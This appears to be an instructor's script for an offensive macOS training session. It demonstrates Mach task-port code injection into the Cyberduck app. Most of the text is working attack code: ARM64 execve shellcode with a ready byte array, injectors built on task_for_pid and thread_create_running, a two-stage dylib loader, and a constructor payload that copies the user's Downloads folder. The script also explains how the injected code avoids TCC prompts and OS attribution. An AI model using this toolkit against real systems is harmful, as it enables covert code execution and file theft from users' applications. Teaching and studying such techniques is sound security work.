# Session: Mach Injection — Shellcode Demo & Dylib Injection
### A continuation of the Mach Microkernel Master Class

---

## Phase 1 — Quick Recap of Last Week (10 min)

**Say**: "Last week we covered the full Mach IPC model from first principles. Let's anchor where we landed."

| What we built | What it proves |
|---|---|
| `receiver.c` — bootstrapped a Mach port and blocked on `mach_msg()` | Any process can create a named IPC endpoint |
| `sender.c` — looked up the port by name, sent a message | SEND rights travel across process boundaries |
| `slack-inject.m` — called `task_for_pid`, wrote shellcode, fired a remote thread | You can own another process's full VM with one API call |

**Say**: "The Slack demo compiled and the injection logic was correct — we could see the task port get acquired. The problem was environmental: Slack's update-required dialog prevents the process from fully initializing, so we never get a stable writeable process to inject into. Same exploit, different target today."

**Say**: "Also — one correction from last week's shellcode. The `svc` instruction on ARM64 macOS takes `#0x80`, not `#0`. That was a subtle bug. Today's code has it right."

---

## Phase 2 — Target Reconnaissance: Why Cyberduck (10 min)

**Say**: "We need a target that is: legitimately installed, running a real GUI process we can wait on, and — critically — not protected by library validation despite having Hardened Runtime."

**Instructor Action**: Open Cyberduck, then run this in Terminal.

```bash
codesign -dv --entitlements - /Applications/Cyberduck.app 2>&1
```

**Point out to students** — walk through these specific lines:

```
flags=0x10000(runtime)              ← Hardened Runtime IS on
TeamIdentifier=G69SCX94XU           ← iterate GmbH, NOT Apple — this is the direct download build
```

Then highlight these three entitlements in the dict:

```xml
<key>com.apple.security.app-sandbox</key>
<false/>                             ← NOT sandboxed

<key>com.apple.security.cs.disable-library-validation</key>
<true/>                              ← unsigned dylibs load fine

<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>                              ← unsigned executable pages allowed
```

**Say**: "Notice what is NOT here: `com.apple.security.files.downloads.read-write`. That entitlement only exists in *sandboxed* apps — it's how sandboxed apps beg the kernel for exceptions to their restricted filesystem view."

**Say**: "`com.apple.security.app-sandbox = false` means Cyberduck is not sandboxed at all. It runs with full user-level filesystem access — `~/Downloads`, `~/Desktop`, `~/Documents`, everything the logged-in user can reach. No entitlement needed because there is no sandbox to grant exceptions to."

**Say**: "So when our code runs inside Cyberduck's process, it inherits that same unrestricted access. The attack surface is actually *wider* than a sandboxed target with explicit TCC entitlements."

**Say**: "The one entitlement that makes this whole attack possible: `disable-library-validation`. Hardened Runtime normally blocks loading of unsigned or foreign-signed dylibs. With this flag set, AMFI waves everything through. That is the hole we are walking through."

---

## Phase 3 — Live Demo: Shellcode Injection into Cyberduck (25 min)

### 3.1 The Shellcode (`shellcode.asm`)

**Say**: "Before we write a single byte, let's understand what we're actually building and why every instruction exists. This is ARM64 macOS shellcode — it has specific rules that are different from Linux ARM64 and from x86. Get any of this wrong and you get a silent crash."

---

#### ARM64 macOS Syscall Rules — Know These Cold

**Whiteboard:**
```
ARM64 macOS BSD Syscall Convention
──────────────────────────────────────────────────────
x0 – x7   : arguments  (matches ARM64 C calling convention)
x16        : syscall NUMBER  ← macOS uses x16. Linux uses x8.
svc #0x80  : fires the syscall ← macOS ONLY. Linux uses svc #0.
──────────────────────────────────────────────────────
syscall #1  = exit
syscall #59 = execve(path, argv, envp)
```

**Say**: "Two things that will burn you coming from Linux. First: syscall number goes in `x16`, not `x8`. Second: `svc #0x80` is the gate to BSD syscalls. `svc #0` is a Mach trap — a completely different kernel subsystem. Using the wrong one silently fails or traps to the wrong handler. This is exactly the `svc #0x80` correction I called out at the start."

---

#### Why `execve`?

**Say**: "`execve` does not spawn a child. It *replaces* the calling process image in place. When we fire this from inside Cyberduck's thread, the Cyberduck process becomes `/bin/zsh`. Same PID. TCC still sees Cyberduck's identity. The OS never sees a new process appear. We're running a shell command inside another app's skin."

**Say**: "The three arguments: `path` = the program to exec, `argv` = array of argument strings (NULL-terminated), `envp` = environment (we pass NULL to inherit). In C: `execve(\"/bin/zsh\", [\"/bin/zsh\", \"-c\", \"cp -R ~/Downloads ~/Library/Colors/\"], NULL)`"

---

#### Why `adr` for Position-Independent Code?

**Say**: "`adr` computes an address as: `PC + offset`. The offset is baked in at assemble time, measured from the instruction itself, so the result is correct no matter where in memory the shellcode lands. ASLR randomizes the load address every run — `adr` is immune to that. If you used an absolute address instead, it would only work on one boot, one machine."

---

#### The Code — Line by Line

```bash
mkdir -p ~/osmr/socam/mach_labs/cyberduck_inject
cd ~/osmr/socam/mach_labs/cyberduck_inject

cat > shellcode.asm << 'EOF'
; ARM64 macOS execve shellcode
; Goal: execve("/bin/zsh", ["/bin/zsh", "-c", "cp -R ~/Downloads ~/Library/Colors/"], NULL)

.text
.global _main
.align 4              ; ARM64 instructions are 4 bytes — must be 4-byte aligned

_main:
    ; ── Load x0 = path argument (/bin/zsh) ──────────────────────────────────
    ; adr calculates: address = PC + offset_to_arg0
    ; This is position-independent — correct regardless of ASLR load address
    adr   x0,  arg0

    ; ── Build argv[] array on the stack ─────────────────────────────────────
    ; argv is: char *argv[] = { "/bin/zsh", "-c", "command", NULL }
    ; We need 4 pointers × 8 bytes = 32 bytes. Stack grows DOWN, so subtract.
    sub   sp,  sp, #(8 * 4)

    ; Load PC-relative addresses of each string argument
    adr   x19, arg0           ; x19 = pointer to "/bin/zsh"
    adr   x20, arg1           ; x20 = pointer to "-c"
    adr   x21, arg2           ; x21 = pointer to the command string

    ; Write argv[] into the stack slots (index 0 is at lowest address)
    str   xzr, [sp, #(8*3)]  ; argv[3] = NULL  (xzr = ARM64 zero register, always 0)
    str   x21, [sp, #(8*2)]  ; argv[2] = &command_string
    str   x20, [sp, #(8*1)]  ; argv[1] = &"-c"
    str   x19, [sp]           ; argv[0] = &"/bin/zsh"

    ; ── Set execve arguments ─────────────────────────────────────────────────
    ; ARM64 calling convention: arg1=x0, arg2=x1, arg3=x2
    ; x0 is already set (path). Now set x1 and x2.
    mov   x1,  sp             ; x1 = argv (our stack array)
    mov   x2,  #0             ; x2 = envp = NULL (inherit environment)

    ; ── Fire BSD syscall 59 (execve) ─────────────────────────────────────────
    mov   x16, #59            ; syscall number in x16 (NOT x8 like Linux)
    svc   #0x80               ; BSD syscall gate (NOT svc #0 — that's a Mach trap)
                              ; On success: process image replaced. Does NOT return.

_exit:                        ; Only reached if execve fails (bad path, permissions)
    mov   x0,  #0
    mov   x16, #1             ; syscall #1 = exit
    svc   #0x80

; ── String data (immediately after code in __text section) ───────────────────
; adr can reach these because they are within ±1MB of each instruction.
; The page is mapped RX — CPU won't execute these; they're just bytes.
arg0: .ascii "/bin/zsh\0"
arg1: .ascii "-c\0"
arg2: .ascii "cp -R ~/Downloads ~/Library/Colors/\0"
EOF

as shellcode.asm -o shellcode.o
```

**Say**: "`xzr` is a hardware zero register built into ARM64 — reading it always returns 0, writing to it is a no-op. It's how we write a NULL pointer into `argv[3]` without burning a register on `mov x_n, #0`."

**Say**: "The strings sit right after the code instructions inside the same `__text` section. That's fine — we map the page as RX, the CPU only executes what we point the PC at. The strings are just data that happens to live on an executable page."

**Now extract the raw bytes** (do this live — do NOT skip this step):

```bash
# awk handles varying indentation in otool output — grep "^ size" is fragile
OFFSET=$(otool -l shellcode.o | awk '/sectname __text/{f=1} f && /[[:space:]]offset[[:space:]]/{print $2; exit}')
SIZE_HEX=$(otool -l shellcode.o | awk '/sectname __text/{f=1} f && /[[:space:]]size[[:space:]]/{print $2; exit}')
SIZE_DEC=$(printf '%d' "$SIZE_HEX")

echo "Text section: offset=$OFFSET  size=$SIZE_DEC bytes"

# Extract exactly those bytes from the .o file
dd if=shellcode.o of=shellcode.bin bs=1 skip=$OFFSET count=$SIZE_DEC 2>/dev/null

# Format as C array — paste this into the injector
xxd -i shellcode.bin
```

**Instructor Note**: Show the `xxd` output on screen. Point out that you can read `/bin/zsh` (`2f 62 69 6e 2f 7a 73 68`) in the last few rows — the strings are in plain ASCII. This is intentional for the lab. In a real implant you'd obfuscate those.

**The verified byte array** (Sonoma 14.x ARM64):
```c
char shellcode[] =
    "\x00\x00\x00\x10\xff\x83\x00\xd1\xd3\x00\x00\x10\xf4\x01\x00\x30"
    "\xf5\x01\x00\x10\xff\x0f\x00\xf9\xf5\x0b\x00\xf9\xf4\x07\x00\xf9"
    "\xf3\x03\x00\xf9\xe1\x03\x00\x91\x02\x00\x80\xd2\x70\x07\x80\xd2"
    "\x01\x00\x00\xd4\x00\x00\x80\xd2\x30\x00\x80\xd2\x01\x00\x00\xd4"
    "\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x00\x2d\x63\x00\x63\x70\x20\x2d"
    "\x52\x20\x7e\x2f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x73\x20\x7e\x2f"
    "\x4c\x69\x62\x72\x61\x72\x79\x2f\x43\x6f\x6c\x6f\x72\x73\x2f\x00";
```

---

### 3.2 The Injector (`cyberduck-inject.m`)

**Say**: "This is functionally identical to `slack-inject.m` from last week — just targeting Cyberduck and with the PID taken as a command-line argument instead of hardcoded."

```bash
cat > cyberduck-inject.m << 'EOF'
// cyberduck-inject.m
// Compile: clang -framework Foundation -o cyberduck-inject cyberduck-inject.m
// Usage:   sudo ./cyberduck-inject <PID>

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <string.h>

#define STACK_SIZE 0x1000
#define CODE_SIZE  128

char shellcode[] =
    "\x00\x00\x00\x10\xff\x83\x00\xd1\xd3\x00\x00\x10\xf4\x01\x00\x30"
    "\xf5\x01\x00\x10\xff\x0f\x00\xf9\xf5\x0b\x00\xf9\xf4\x07\x00\xf9"
    "\xf3\x03\x00\xf9\xe1\x03\x00\x91\x02\x00\x80\xd2\x70\x07\x80\xd2"
    "\x01\x00\x00\xd4\x00\x00\x80\xd2\x30\x00\x80\xd2\x01\x00\x00\xd4"
    "\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x00\x2d\x63\x00\x63\x70\x20\x2d"
    "\x52\x20\x7e\x2f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x73\x20\x7e\x2f"
    "\x4c\x69\x62\x72\x61\x72\x79\x2f\x43\x6f\x6c\x6f\x72\x73\x2f\x00";

int main(int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <pid>\n", argv[0]); return 1; }

    pid_t pid = (pid_t)atoi(argv[1]);
    printf("[*] Target PID: %d\n", pid);

    // 1. Acquire task port
    task_t remoteTask;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] task_for_pid: %s\n    Root? SIP off? Right PID?\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Task port: 0x%x\n", remoteTask);

    // 2. Allocate stack and code pages inside Cyberduck's VM
    mach_vm_address_t remoteStack64 = 0, remoteCode64 = 0;
    mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    mach_vm_allocate(remoteTask, &remoteCode64,  CODE_SIZE,  VM_FLAGS_ANYWHERE);
    printf("[+] Stack: 0x%llx  Code: 0x%llx\n", remoteStack64, remoteCode64);

    // 3. Write shellcode across process boundary
    mach_vm_write(remoteTask, remoteCode64, (vm_address_t)shellcode, CODE_SIZE);

    // 4. Set W^X permissions
    vm_protect(remoteTask, remoteCode64,  CODE_SIZE,  FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE,  VM_PROT_READ | VM_PROT_WRITE);
    printf("[+] Memory permissions set\n");

    // 5. Build ARM64 thread state — PC and SP only
    struct arm_unified_thread_state remoteThreadState64;
    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count  = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (uint64_t)remoteCode64;
    remoteThreadState64.ts_64.__sp = (uint64_t)(remoteStack64 + STACK_SIZE / 2);

    // 6. Fire — spawns thread inside Cyberduck immediately
    thread_act_t remoteThread;
    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64,
                               (thread_state_t)&remoteThreadState64.ts_64,
                               ARM_THREAD_STATE64_COUNT, &remoteThread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_create_running: %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[+] Thread 0x%x running inside Cyberduck.\n", remoteThread);
    printf("[+] Check ~/Library/Colors/ for ~/Downloads contents.\n");
    return 0;
}
EOF

clang -framework Foundation -o cyberduck-inject cyberduck-inject.m
```

---

### 3.3 Run It

```bash
# Prep the staging dir
mkdir -p ~/Library/Colors/

# Launch Cyberduck and grab its PID
open /Applications/Cyberduck.app
sleep 3
DUCK_PID=$(pgrep -x Cyberduck)
echo "[*] Cyberduck PID: $DUCK_PID"

# Fire
sudo ./cyberduck-inject $DUCK_PID

# Verify
sleep 2
ls ~/Library/Colors/
```

**Expected**: Contents of `~/Downloads` appear in `~/Library/Colors/`. No TCC dialog.

**Say**: "That's the shellcode demo working. The Downloads access came from Cyberduck's entitlement — our code ran inside its process. The OS never saw us."

---

## Phase 4 — The Problem with Shellcode (5 min)

**Say**: "Shellcode is limited. It's assembly — no Objective-C, no Swift, no dynamic libraries. If we want to run rich code inside the target, we need to load a `.dylib`. But there's a critical problem."

**Say**: "If we just swap the shellcode out for a call to `dlopen('payload.dylib', RTLD_NOW)` and fire it with `thread_create_running` — Cyberduck crashes instantly."

**Whiteboard:**
```
thread_create_running()
    → creates a raw KERNEL Mach thread
    → NO pthread context
    → pthread_t pointer = NULL

dlopen() internally needs:
    → pthread mutex (_dyld_global_lock)
    → process heap (malloc)
    → ObjC/Swift class init callbacks
    → ALL read from pthread_t struct
    → SIGBUS on first dereference of NULL
```

**Say**: "The fix is a single undocumented Apple API: `pthread_create_from_mach_thread()`. It wraps our bare Mach thread in a real `pthread_t` context. After that call, our thread is a full POSIX thread and can safely call `dlopen`."

---

## Phase 5 — Building the Dylib Injector (40 min)

### 5.1 Overview

**Say**: "We need three components."

```
loader.asm          ← Stage 1 shellcode injected by thread_create_running
                       Calls pthread_create_from_mach_thread → dlopen thread
                       Then calls pthread_exit to clean itself up

inject.dylib        ← Our payload. __attribute__((constructor)) fires on load.
                       Runs inside Cyberduck with its TCC permissions.

cyberduck-inject-dylib.m
                    ← Same injector structure as before.
                       New: resolves 3 function addresses from shared cache,
                       patches them into the shellcode before injecting.
```

**Say**: "The addresses of `dlopen`, `pthread_create_from_mach_thread`, and `pthread_exit` are identical in every process on this machine. That's the dyld shared cache — ASLR slide applied once at boot, system-wide. My address for `dlopen` is Cyberduck's address for `dlopen`."

---

### 5.2 The Loader Shellcode (`loader.asm`)

**Say**: "This shellcode has a two-part structure: a main body that calls `pthread_create_from_mach_thread`, and a callback function that runs in the new POSIX thread and calls `dlopen`. The three function pointers are 8-byte ASCII placeholders that we patch at runtime."

```bash
cat > loader.asm << 'EOF'
// loader.asm - Stage 1: bridge bare Mach thread to POSIX, then dlopen the payload
// Placeholders DLOPEN__, PTHRDCRT, PTHRDEXT are patched by the injector before injection.

.text
.global _main
.align 4

_main:
    // Save frame, allocate 16 bytes for pthread_t output
    pacibsp
    stp    x29, x30, [sp, #-16]!
    mov    x29, sp
    sub    sp,  sp,  #16

    // Load patched function pointers from data section
    adr    x8,  _pthread_create_ptr
    ldr    x21, [x8]                  // x21 = pthread_create_from_mach_thread
    adr    x8,  _pthread_exit_ptr
    ldr    x22, [x8]                  // x22 = pthread_exit

    // pthread_create_from_mach_thread(&t, NULL, _thread_callback, &_lib_path)
    mov    x0,  sp                    // &pthread_t storage (on our stack)
    mov    x1,  #0                    // NULL attrs
    adr    x2,  _thread_callback      // callback fn
    adr    x3,  _lib_path             // arg = dylib path string
    blr    x21

    // pthread_exit(NULL) — clean up THIS bare Mach thread
    add    sp,  sp,  #16
    mov    x0,  #0
    blr    x22

    ldp    x29, x30, [sp], #16
    retab

// Stage 2: runs in a full POSIX thread — safe to call dlopen
_thread_callback:
    pacibsp
    stp    x29, x30, [sp, #-32]!
    stp    x19, x20, [sp, #16]
    mov    x29, sp

    // Load dlopen and pthread_exit pointers
    adr    x8,  _dlopen_ptr
    ldr    x20, [x8]                  // x20 = dlopen
    adr    x8,  _pthread_exit_ptr
    ldr    x19, [x8]                  // x19 = pthread_exit

    // dlopen(path, RTLD_NOW=2)  — x0 is already the path arg passed in
    mov    x1,  #2
    blr    x20                        // constructor in our dylib fires here

    // pthread_exit(NULL)
    mov    x0,  #0
    ldp    x19, x20, [sp, #16]
    ldp    x29, x30, [sp], #32
    blr    x19

    retab

// ── Placeholder slots (8 bytes each) — overwritten before injection ──────────
.align 8
_dlopen_ptr:         .ascii "DLOPEN__"
_pthread_create_ptr: .ascii "PTHRDCRT"
_pthread_exit_ptr:   .ascii "PTHRDEXT"

// ── Dylib path (52-byte slot) — overwritten before injection ─────────────────
.align 4
_lib_path: .ascii "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB\0"
EOF

as loader.asm -o loader.o
```

**Extract the bytes** (do this live on the VM):

```bash
OFFSET=$(otool -l loader.o | awk '/sectname __text/{f=1} f && /[[:space:]]offset[[:space:]]/{print $2; exit}')
SIZE_HEX=$(otool -l loader.o | awk '/sectname __text/{f=1} f && /[[:space:]]size[[:space:]]/{print $2; exit}')
SIZE_DEC=$(printf '%d' "$SIZE_HEX")
echo "offset=$OFFSET  size=$SIZE_DEC bytes"

dd if=loader.o of=loader.bin bs=1 skip=$OFFSET count=$SIZE_DEC 2>/dev/null
xxd -i loader.bin
```

**Say**: "Paste that output into the `loader_shellcode[]` array in the injector. The placeholder strings `DLOPEN__`, `PTHRDCRT`, `PTHRDEXT`, and `LIBLIBLIB...` will be visible as ASCII in the hex dump — that's how you know the structure is right."

---

### 5.3 The Payload Dylib (`toinject.c`)

```bash
cat > toinject.c << 'EOF'
// toinject.c — loaded by dlopen() inside Cyberduck's process
// Compile: clang -dynamiclib -o inject.dylib toinject.c

#include <stdlib.h>
#include <syslog.h>

__attribute__((constructor))
static void payload(int argc, const char **argv) {
    // Confirm injection — visible in Console.app and 'log stream'
    syslog(LOG_ERR, "[INJECTED] Running inside Cyberduck PID %d", getpid());

    // Cyberduck is NOT sandboxed (app-sandbox=false) so we inherit full
    // user-level filesystem access — no TCC entitlement needed for Downloads.
    system("cp -R ~/Downloads ~/Library/Colors/ 2>/dev/null");

    syslog(LOG_ERR, "[INJECTED] Done. ~/Downloads -> ~/Library/Colors/");
}
EOF

clang -dynamiclib -o inject.dylib toinject.c
mkdir -p ~/Library/Colors/
cp inject.dylib ~/Library/Colors/inject.dylib
```

**Say**: "`__attribute__((constructor))` tells the dynamic linker to run this function the instant the dylib is mapped. We do not need `dlsym` — `dyld` fires it automatically."

---

### 5.4 The Full Dylib Injector (`cyberduck-inject-dylib.m`)

**Say**: "Same structure as the shellcode injector. Three additions: resolve function pointers, run the patching loop, then use the patched loader shellcode as our payload."

```bash
cat > cyberduck-inject-dylib.m << 'EOF'
// cyberduck-inject-dylib.m
// Compile: clang -framework Foundation -o cyberduck-inject-dylib cyberduck-inject-dylib.m
// Usage:   sudo ./cyberduck-inject-dylib <PID> [/path/to/inject.dylib]

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>

#define STACK_SIZE 0x4000   // 16 KB — generous for POSIX thread startup
#define CODE_SIZE  256      // Must fit loader shellcode + placeholder data

// pthread_create_from_mach_thread is exported but not in any public header
extern int pthread_create_from_mach_thread(pthread_t *,
    const pthread_attr_t *, void *(*)(void *), void *);

// ── Paste xxd -i loader.bin output here ──────────────────────────────────────
// The DLOPEN__, PTHRDCRT, PTHRDEXT, and LIBLIBLIB... strings will be visible
// as ASCII in your xxd output — that confirms the structure is correct.
unsigned char loader_shellcode[CODE_SIZE] = {
    // TODO: paste your 'xxd -i loader.bin' output here
    // Leave zeros for now; patching will fail until real bytes are here.
    0
};

int main(int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <pid> [dylib_path]\n", argv[0]); return 1; }

    pid_t pid = (pid_t)atoi(argv[1]);
    const char *dylib_path = (argc >= 3) ? argv[2] : NULL;

    // Build dylib path
    char path[256];
    if (dylib_path) {
        strncpy(path, dylib_path, sizeof(path) - 1);
    } else {
        const char *home = getenv("HOME") ?: "/Users/offsec";
        snprintf(path, sizeof(path), "%s/Library/Colors/inject.dylib", home);
    }

    printf("[*] PID: %d\n[*] Dylib: %s\n", pid, path);

    // ── Step 1: Resolve addresses from dyld shared cache ─────────────────────
    // These addresses are IDENTICAL in every process on this machine.
    // The shared cache ASLR slide is set once at boot and applied system-wide.
    uint64_t addr_dlopen    = (uint64_t)dlopen;
    uint64_t addr_pthr_crt  = (uint64_t)pthread_create_from_mach_thread;
    uint64_t addr_pthr_exit = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");

    printf("[*] dlopen:                          0x%016llx\n", addr_dlopen);
    printf("[*] pthread_create_from_mach_thread: 0x%016llx\n", addr_pthr_crt);
    printf("[*] pthread_exit:                    0x%016llx\n", addr_pthr_exit);

    if (!addr_dlopen || !addr_pthr_crt || !addr_pthr_exit) {
        fprintf(stderr, "[-] Failed to resolve function addresses.\n"); return -1;
    }

    // ── Step 2: Patch placeholder slots ──────────────────────────────────────
    char *p = (char *)loader_shellcode;
    int found_dlopen = 0, found_crt = 0, found_exit = 0, found_path = 0;

    for (int i = 0; i < CODE_SIZE - 9; i++, p++) {
        if (!found_dlopen && memcmp(p, "DLOPEN__", 8) == 0) {
            memcpy(p, &addr_dlopen,    8); found_dlopen = 1;
            printf("[+] Patched DLOPEN__  at offset %d\n", i);
        }
        if (!found_crt && memcmp(p, "PTHRDCRT", 8) == 0) {
            memcpy(p, &addr_pthr_crt,  8); found_crt = 1;
            printf("[+] Patched PTHRDCRT at offset %d\n", i);
        }
        if (!found_exit && memcmp(p, "PTHRDEXT", 8) == 0) {
            memcpy(p, &addr_pthr_exit, 8); found_exit = 1;
            printf("[+] Patched PTHRDEXT at offset %d\n", i);
        }
        if (!found_path && memcmp(p, "LIBLIBLIB", 9) == 0) {
            memset(p, 0, 52);
            strncpy(p, path, 51); found_path = 1;
            printf("[+] Patched path     at offset %d -> %s\n", i, path);
        }
    }

    if (!found_dlopen || !found_crt || !found_exit || !found_path) {
        fprintf(stderr,
            "[-] Patching incomplete — did you paste the loader.bin bytes?\n"
            "    dlopen=%d crt=%d exit=%d path=%d\n",
            found_dlopen, found_crt, found_exit, found_path);
        return -1;
    }
    printf("[+] Shellcode fully patched.\n");

    // ── Step 3: Acquire task port ─────────────────────────────────────────────
    task_t remoteTask;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] task_for_pid: %s\n", mach_error_string(kr)); return -1;
    }
    printf("[+] Task port: 0x%x\n", remoteTask);

    // ── Steps 4–7: Allocate, write, protect, configure, fire ─────────────────
    mach_vm_address_t remoteStack64 = 0, remoteCode64 = 0;
    mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    mach_vm_allocate(remoteTask, &remoteCode64,  CODE_SIZE,  VM_FLAGS_ANYWHERE);

    mach_vm_write(remoteTask, remoteCode64, (vm_address_t)loader_shellcode, CODE_SIZE);

    vm_protect(remoteTask, remoteCode64,  CODE_SIZE,  FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE,  VM_PROT_READ | VM_PROT_WRITE);

    struct arm_unified_thread_state remoteThreadState64;
    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count  = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (uint64_t)remoteCode64;
    remoteThreadState64.ts_64.__sp = (uint64_t)(remoteStack64 + STACK_SIZE / 2);

    thread_act_t remoteThread;
    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64,
                               (thread_state_t)&remoteThreadState64.ts_64,
                               ARM_THREAD_STATE64_COUNT, &remoteThread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_create_running: %s\n", mach_error_string(kr)); return -1;
    }

    printf("[+] Stage 1 thread running: 0x%x\n", remoteThread);
    printf("[+] -> pthread_create_from_mach_thread fires\n");
    printf("[+] -> Stage 2 POSIX thread calls dlopen('%s')\n", path);
    printf("[+] -> Constructor payload executes inside Cyberduck\n");
    return 0;
}
EOF

clang -framework Foundation -o cyberduck-inject-dylib cyberduck-inject-dylib.m
```

---

### 5.5 Run the Full Demo

```bash
# Terminal 1: Watch for injection evidence
log stream --style syslog \
  --predicate 'eventMessage CONTAINS[c] "INJECTED"'

# Terminal 2: Launch Cyberduck and inject
open /Applications/Cyberduck.app
sleep 3
DUCK_PID=$(pgrep -x Cyberduck)
echo "[*] Cyberduck PID: $DUCK_PID"

sudo ./cyberduck-inject-dylib $DUCK_PID ~/Library/Colors/inject.dylib
```

**Watch Terminal 1 for**:
```
Cyberduck[XXXX]: [INJECTED] Running inside Cyberduck PID XXXX
Cyberduck[XXXX]: [INJECTED] Done. ~/Downloads -> ~/Library/Colors/
```

**Say**: "The syslog entry says *Cyberduck* — not our injector. From the OS perspective, Cyberduck accessed its own Downloads folder. This is the complete attack chain: Mach task port → remote memory write → thread promotion → dylib load → constructor payload — all chained together."

---

## End of Session Summary

| Component | Purpose |
|---|---|
| `shellcode.asm` | ARM64 `execve` payload, PIC with `adr` |
| `cyberduck-inject.m` | Proves task port injection works against real app |
| `loader.asm` | Stage 1: bridges Mach→POSIX thread, triggers `dlopen` |
| `toinject.c` | Dylib payload with `__attribute__((constructor))` |
| `cyberduck-inject-dylib.m` | Full chain: shared cache lookup + patch + inject |

**The three things to remember**:
1. `disable-library-validation` is what makes the target *injectable*. `app-sandbox=false` is what gives injected code *unrestricted filesystem access*. These are two separate wins from the same target.
2. You can never call `dlopen` from a raw Mach thread — always bridge with `pthread_create_from_mach_thread` first
3. Shared cache addresses are boot-time constants — they are valid across all processes simultaneously

---

> **If Cyberduck doesn't work**: Confirm it's the direct download version (not Mac App Store). The App Store version has stricter sandbox entitlements and `task_for_pid` will fail even as root. Run `codesign -dv /Applications/Cyberduck.app 2>&1 | grep TeamIdentifier` — you want `G69SCX94XU`.
